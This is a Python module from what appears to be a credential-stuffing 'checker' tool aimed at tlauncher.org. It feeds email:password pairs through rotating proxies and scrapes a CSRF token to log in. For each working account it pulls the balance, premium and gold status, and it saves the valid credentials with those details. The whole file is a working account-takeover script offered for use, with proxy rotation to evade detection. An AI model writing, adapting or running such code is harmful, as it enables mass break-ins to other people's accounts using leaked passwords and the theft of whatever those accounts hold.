from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import get,post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)
        header_1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" ,
            "Pragma": "no-cache" ,
            "Accept": "*/*" 
        }
        header_2 = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://tlauncher.org",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-GPC": "1",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://tlauncher.org/en/",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        }
        header_3 = {
            "Connection": "keep-alive" ,
            "Accept": "*/*" ,
            "X-Requested-With": "XMLHttpRequest" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36" ,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" ,
            "Sec-GPC": "1" ,
            "Origin": "https://tlauncher.org" ,
            "Sec-Fetch-Site": "same-origin" ,
            "Sec-Fetch-Mode": "cors" ,
            "Sec-Fetch-Dest": "empty" ,
            "Referer": "https://tlauncher.org/my/" ,
            "Accept-Language": "en-US,en;q=0.9" ,
            "Accept-Encoding": "gzip, deflate" 
        }
        data_1 = "x-csrf-token={}&page_open=auth_modal&login={}&psw2={}"
        data_2 = "knockout_model=main&lang=en&csrf-token={}&ajax-token={}&user={}"  
        try:
            csrf = get("https://tlauncher.org/my/",headers=header_1,proxies=proxy_set,timeout=Checker.timeout).text.split("name=\"x-csrf-token\" data-csrf=\"")[1].split("\"")[0]
            response = post("https://tlauncher.org/en/",data=data_1.format(csrf,email,password),headers=header_2,proxies=proxy_set,timeout=Checker.timeout)
            if "Passwords do not match" in response.text:
                retries += 1
            elif "User area" in response.text or "Your balance:" in response.text:
                id = response.text.split("type='hidden' name='user' value='")[1].split("'")[0]
                cs = response.text.split("Switcher__checkbox sr-only\" id=\"io\" data-csrf=\"")[1].split("\"")[0]
                aj = response.text.split(f"data-csrf=\"{cs}\" data-ajax=\"")[1].split("\"")[0]
                
                response = post("https://tlauncher.org/ajax.php",data=data_2.format(cs,aj,id),headers=header_3,proxies=proxy_set,timeout=Checker.timeout).text
                balance = response.split("balans\":\"")[1].split("\",\"")[0]
                premium = response.split("premium\":{\"forever\":")[1].split(",\"")[0]
                gold = response.split("goldTime\":\"")[1].split("\",\"")[0]
                Checker.good += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("good",email+":"+password,"Tlauncher")
                save("Tlauncher","good",Checker.time,email+":"+password+f" | Balance: {balance} | Premium Forever: {premium} | Gold Time: {gold}")
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return